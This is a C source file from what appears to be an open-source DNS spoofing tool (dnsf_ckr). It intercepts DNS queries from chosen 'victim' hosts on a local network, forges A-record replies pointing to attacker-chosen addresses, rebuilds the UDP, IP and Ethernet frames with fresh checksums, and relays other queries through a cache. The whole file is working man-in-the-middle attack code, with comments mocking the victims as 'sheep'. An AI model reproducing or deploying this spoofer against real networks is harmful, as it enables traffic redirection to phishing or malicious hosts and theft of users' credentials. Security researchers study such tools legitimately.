/*
 *                              Copyright (C) 2014 by Rafael Santiago
 *
 * This is free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include "dnsspf.h"
#include "ctxs.h"
#include "udp.h"
#include "ip.h"
#include "arp.h"
#include "eth.h"
#include "mem.h"
#include "dns.h"
#include <string.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <time.h>

static pthread_mutex_t dnscaching_mtx = PTHREAD_MUTEX_INITIALIZER;

static char last_name_resolved[0xff] = "";

static time_t last_resolution_time = 0;

static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned long src, const unsigned long dest, dnsf_ckr_realdnstransactions_ctx *transactions);

static char *dnsf_ckr_qname2cstr(const unsigned char *qname);

static dnsf_ckr_victims_ctx *dnsf_ckr_get_victim_from_transactions(const unsigned long v_addr, dnsf_ckr_realdnstransactions_ctx *transactions);

static dnsf_ckr_hostnames_ctx *dnsf_ckr_must_spoof_dns_response(const unsigned long src_addr, const char *hostname, dnsf_ckr_fakenameserver_ctx *fakenameserver);

static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned long src, const unsigned long dest, dnsf_ckr_realdnstransactions_ctx *transactions) {
    dnsf_ckr_realdnstransactions_ctx *tp;
    for (tp = transactions; tp; tp = tp->next) {
        if (htonl(tp->victim->addr) == src && htonl(tp->sends_reqs_to->addr) == dest) {
            return 1;
        }
    }
    return 0;
}

static char *dnsf_ckr_qname2cstr(const unsigned char *qname) {
    char *cstr = NULL, *c;
    const unsigned char *q;
    if (qname == NULL) {
        return NULL;
    }
    cstr = (char *) dnsf_ckr_getmemory(0xff);
    memset(cstr, 0, 0xff);
    q = qname;
    c = cstr;
    while (*q != 0 && c < (cstr + 0xff)) {
        memcpy(c, q + 1, *q);
        c += *q;
        q += (*q) + 1;
        if (*q != 0) {
            *c = '.';
            c++;
        }
    }
    return cstr;
}

static dnsf_ckr_victims_ctx *dnsf_ckr_get_victim_from_transactions(const unsigned long v_addr, dnsf_ckr_realdnstransactions_ctx *transactions) {
    dnsf_ckr_realdnstransactions_ctx *tp;
    for (tp = transactions; tp; tp = tp->next) {
        if (htonl(tp->victim->addr) == v_addr) {
            return tp->victim;
        }
    }
    return NULL;
}

static dnsf_ckr_hostnames_ctx *dnsf_ckr_must_spoof_dns_response(const unsigned long src_addr, const char *hostname, dnsf_ckr_fakenameserver_ctx *fakenameserver) {
    dnsf_ckr_fakenameserver_ctx *fp;
    dnsf_ckr_hostnames_ctx *hp;
    for (fp = fakenameserver; fp; fp = fp->next) {
        if (htonl(fp->with->addr) == src_addr) {
            for (hp = fp->mess_up->hostnames; hp; hp = hp->next) {
                if (strcmp(hp->name, hostname) == 0) {
                    return hp;
                }
            }
        }
    }
    return NULL;
}

static void dnsf_ckr_spoof_dns_response(struct dnsf_ckr_dns_header **dns, dnsf_ckr_hostnames_ctx *hostname, const int dnsspf_ttl) {
    if (hostname == NULL || dns == NULL) {
        return;
    }
    if ((*dns)->rscrecfmt.rdata != NULL) {
        free((*dns)->rscrecfmt.rdata);
    }
    (*dns)->qr = 1;
    (*dns)->ra = 0;
    (*dns)->ancount = 1;
    (*dns)->arcount = 0;
    (*dns)->nscount = 0;
    (*dns)->rcode = 0; //  no error condition.
    (*dns)->rscrecfmt.type = DNSF_CKR_TYPE_A;
    (*dns)->rscrecfmt.clss = DNSF_CKR_CLASS_IN;
    (*dns)->rscrecfmt.ttl = dnsspf_ttl;
    (*dns)->rscrecfmt.rdata = (unsigned char *) dnsf_ckr_getmemory(sizeof(hostname->addr));
    (*dns)->rscrecfmt.rdlen = 4;
    memcpy((*dns)->rscrecfmt.rdata, &hostname->addr, sizeof(hostname->addr));
}

dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, const unsigned char src_mac[6], char *domain_name, size_t domain_name_sz, dnsf_ckr_victims_ctx **victim, dnsf_ckr_hostnames_ctx **hostinfo, const int dnsspf_ttl, dnsf_ckr_dnsresolvcache_ctx **dnscache, const int cache_size) {
    struct dnsf_ckr_ip_header *ip = NULL;
    struct dnsf_ckr_udp_header *udp = NULL;
    struct dnsf_ckr_ethernet_frame eth;
    struct dnsf_ckr_dns_header *dns = NULL;
    dnsf_ckr_hostnames_ctx *hp = NULL;
    dnsf_ckr_victims_ctx *vp;
    char *hostname = NULL;
    unsigned char *rawpkt = NULL;
    unsigned short temp_port;
    unsigned long temp_addr;
    size_t rawpktsz;
    dnsf_ckr_dnsresolvcache_ctx *cache_entry = NULL;
    dnsf_ckr_action_t action = dnsf_ckr_action_none;
    if (domain_name != NULL) {
        memset(domain_name, 0, domain_name_sz);
    }
    *victim = NULL;
    *hostinfo = NULL;
    if (pktsz < 20) {
        return dnsf_ckr_action_none;
    }
    ip = dnsf_ckr_parse_ip_dgram(pkt, pktsz);
    if (ip == NULL) {
        return dnsf_ckr_action_none;
    }
    if (dnsf_ckr_packet_from_victim_to_dnsserver(ip->src, ip->dest, transactions)) {
        //  INFO(Santiago): Spoof bloody spoof... so, it must be udp..
        if (ip->proto == 17) {
            action = dnsf_ckr_action_repass;
            udp = dnsf_ckr_parse_udp_dgram(ip->payload, ip->payload_size);
            if (udp->dest == 53) { //  ..must be dns..
                dns = unpack_dns_data(udp->payload, udp->payload_size);
                if (dns->qr == 0) { //  ..must be a query..
                    hostname = dnsf_ckr_qname2cstr(dns->questionsec.qname);
                    //printf("HOSTNAME = %s\n", hostname);
                    if (strcmp(hostname, last_name_resolved) == 0) {
                        if ((time(0) - last_resolution_time) < 10) {
                            free(ip->payload);
                            free(ip);
                            free(udp->payload);
                            free(udp);
                            free(dns);
                            free(hostname);
                            return dnsf_ckr_action_none;
                        }
                    }
                    strncpy(last_name_resolved, hostname, sizeof(last_name_resolved) - 1);
                    last_resolution_time = time(0);
                    strncpy(domain_name, hostname, domain_name_sz - 1);
                    if ((hp = dnsf_ckr_must_spoof_dns_response(ip->src, hostname, fakenameserver))) { //  we really want to spoof it?
                        vp = dnsf_ckr_get_victim_from_transactions(ip->src, transactions);
                        *hostinfo = hp;
                        *victim = vp;
                        //  ..ok, here we go!! >:)
                        action = dnsf_ckr_action_spoof;
                        dnsf_ckr_spoof_dns_response(&dns, hp, dnsspf_ttl);
                        //  recalculating the checksums
                        free(udp->payload);
                        temp_port = udp->src;
                        udp->src = udp->dest;
                        udp->dest = temp_port;
                        udp->len -= udp->payload_size;
                        udp->payload = NULL;
                        udp->payload_size = pack_dns_data(&udp->payload, *dns);
                        udp->len += udp->payload_size;
                        udp->chsum = 0;
                        rawpkt = dnsf_ckr_mk_udp_dgram(&rawpktsz, *udp);
                        udp->chsum = dnsf_ckr_compute_udp_chsum(rawpkt, rawpktsz, ip->src, ip->dest, udp->len); //  for udp
                        free(rawpkt);
                        temp_addr = ip->src;
                        ip->src = ip->dest;
                        ip->dest = temp_addr;
                        ip->len -= ip->payload_size;
                        free(ip->payload);
                        ip->payload = dnsf_ckr_mk_udp_dgram(&ip->payload_size, *udp);
                        ip->len += ip->payload_size;
                        ip->chsum = 0;
                        rawpkt = dnsf_ckr_mk_ip_dgram(&rawpktsz, *ip);
                        ip->chsum = dnsf_ckr_compute_chsum(rawpkt, rawpktsz - ip->payload_size); //  now for ip
                        free(rawpkt);
                        eth.ether_type = ETHER_TYPE_IP;
                        rawpkt = dnsf_ckr_mac2byte(vp->hw_addr, 6);
                        memcpy(eth.dest_hw_addr, rawpkt, sizeof(eth.dest_hw_addr));
                        free(rawpkt);
                        //  here the "src mac" is a indirection to "local mac" since the client was spoofed...
                        memcpy(eth.src_hw_addr, src_mac, sizeof(eth.src_hw_addr));
                        //  let's to assemble the ethernet frame..
                        eth.payload = dnsf_ckr_mk_ip_dgram(&eth.payload_size, *ip);
                        //  done. Now some lovely sheep on the network must believe in this
                        //  response buffer.
                        *outpkt = dnsf_ckr_mk_ethernet_frame(outpktsz, eth);
                        free(eth.payload);
                        free(udp->payload);
                        udp->payload = NULL;
                        free(ip->payload);
                        ip->payload = NULL;
                        free(udp);
                        udp = NULL;
                        free(ip);
                        ip = NULL;
                        free(dns->rscrecfmt.rdata);
                        dns->rscrecfmt.rdata = NULL;
                        free(dns);
                        dns = NULL;
                    } else {
                        vp = dnsf_ckr_get_victim_from_transactions(ip->src, transactions);
                        if (vp != NULL) {
                            *victim = vp;
                            action = dnsf_ckr_action_spoof;
                            //  ..otherwise we need to discover the real ip of this untreated domain
                            //  and so repass it to the "victim".
                            free(udp->payload);
                            udp->len -= udp->payload_size;
                            pthread_mutex_lock(&dnscaching_mtx);
                            if ((cache_entry = get_dnsf_ckr_dnsresolvcache_ctx_dname(hostname, *dnscache)) == NULL) {
                                udp->payload = dnsf_ckr_mk_dnsresponse(&udp->payload_size, udp->payload, udp->payload_size, ip->dest);
                                if (udp->payload_size > 0) {
                                    *dnscache = push_resolution_to_dnsf_ckr_dnsresolvcache_ctx(dnscache, (size_t)cache_size, hostname, strlen(hostname), udp->payload, (size_t)udp->payload_size);
                                    printf("ADDED %s %d\n", (*dnscache)->dname, udp->payload_size);
                                }
                            } else {
                                udp->payload = (unsigned char *) dnsf_ckr_getmemory(cache_entry->reply_size);
                                udp->payload_size = cache_entry->reply_size;
                                udp->payload[0] = (dns->id >> 8);
                                udp->payload[1] = (dns->id & 0x00ff);
                                printf("%d\n", cache_entry->reply_size - 2);
                                memcpy(&udp->payload[2], &cache_entry->reply[2], cache_entry->reply_size - 2);
                                printf("READ FROM CACHE ;)\n");
                            }
                            pthread_mutex_unlock(&dnscaching_mtx);
                            udp->len += udp->payload_size;
                            temp_port = udp->src;
                            udp->src = udp->dest;
                            udp->dest = temp_port;
                            udp->chsum = 0;
                            //  now assembling the network and transport layer of our "dns echo" response
                            rawpkt = dnsf_ckr_mk_udp_dgram(&rawpktsz, *udp);
                            udp->chsum = dnsf_ckr_compute_udp_chsum(rawpkt, rawpktsz, ip->src, ip->dest, udp->len);
                            free(rawpkt);

                            temp_addr = ip->src;
                            ip->src = ip->dest;
                            ip->dest = temp_addr;
                            ip->len -= ip->payload_size;
                            free(ip->payload);
                            ip->payload = dnsf_ckr_mk_udp_dgram(&ip->payload_size, *udp);
                            ip->len += ip->payload_size;
                            ip->chsum = 0;
                            rawpkt = dnsf_ckr_mk_ip_dgram(&rawpktsz, *ip);
                            ip->chsum = dnsf_ckr_compute_chsum(rawpkt, rawpktsz - ip->payload_size);
                            free(rawpkt);

                            eth.ether_type = ETHER_TYPE_IP;
                            rawpkt = dnsf_ckr_mac2byte(vp->hw_addr, 6);
                            memcpy(eth.dest_hw_addr, rawpkt, sizeof(eth.dest_hw_addr));
                            free(rawpkt);
                            memcpy(eth.src_hw_addr, src_mac, sizeof(eth.src_hw_addr));
                            eth.payload = dnsf_ckr_mk_ip_dgram(&eth.payload_size, *ip);
                            *outpkt = dnsf_ckr_mk_ethernet_frame(outpktsz, eth);
                            free(eth.payload);
                            free(udp->payload);
                            free(udp);
                            udp = NULL;
                            free(ip->payload);
                            free(ip);
                            ip = NULL;
                        }
                    }
                    free(hostname);

                }
                if (dns != NULL) {
                    if (dns->rscrecfmt.rdata != NULL) {
                        free(dns->rscrecfmt.rdata);
                    }
                    free(dns);
                }
            } else {
                //  INFO(Santiago): avoiding packet loop.
                //action = dnsf_ckr_proc_eth_frame(pkt, pktsz, outpkt, outpktsz, transactions);
                //*outpkt = NULL;
            }
            if (udp != NULL) {
                if (udp->payload != NULL) {
                    free(udp->payload);
                }
                free(udp);
            }
        } else {
            action = dnsf_ckr_proc_eth_frame(pkt, pktsz, outpkt, outpktsz, transactions);
            //*outpkt = NULL;
        }

    }
    if (ip != NULL) {
        if (ip->payload != NULL) {
            free(ip->payload);
        }
        free(ip);
    }
    return action;
}

dnsf_ckr_action_t dnsf_ckr_proc_eth_frame(const unsigned char *frame, const size_t framesz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions) {
    dnsf_ckr_action_t action = dnsf_ckr_action_none;
    dnsf_ckr_realdnstransactions_ctx *tp;
    unsigned long dest_addr, src_addr;
    int must_process = 0;
    unsigned char *mac_byte, *out_p; //  a shakespearian variable @:-)
    if (outpkt == NULL || outpktsz == NULL) {
        return dnsf_ckr_action_none;
    }
    *outpkt = NULL;
    if (framesz > 14) {
        if (*(frame + 12) == 0x08 && *(frame + 13) == 0x00) { //  ip packet
            src_addr = (((unsigned long)*((frame + 14) + 12)) << 24) |
                       (((unsigned long)*((frame + 14) + 13)) << 16) |
                       (((unsigned long)*((frame + 14) + 14)) <<  8) |
                       ((unsigned long)*((frame + 14) + 15));
            src_addr = htonl(src_addr);
            dest_addr = (((unsigned long)*((frame + 14) + 16)) << 24) |
                        (((unsigned long)*((frame + 14) + 17)) << 16) |
                        (((unsigned long)*((frame + 14) + 18)) <<  8) |
                        ((unsigned long)*((frame + 14) + 19));
            dest_addr = htonl(dest_addr);
            for (tp = transactions; tp; tp = tp->next) {
                must_process = (tp->sends_reqs_to->addr == dest_addr &&
                                tp->victim->addr == src_addr);
                if (must_process) {
                    break;
                }
            }
            if (must_process) {
                *outpkt = (unsigned char *) dnsf_ckr_getmemory(framesz);
                *outpktsz = framesz;
                out_p = *outpkt;
                memcpy(out_p, frame, framesz);
                mac_byte = dnsf_ckr_mac2byte(tp->sends_reqs_to->hw_addr, 6);
                memcpy(out_p, mac_byte, 6); //  mac size
                free(mac_byte);
                action = dnsf_ckr_action_repass;
            }
        }
    }
    return action;
}
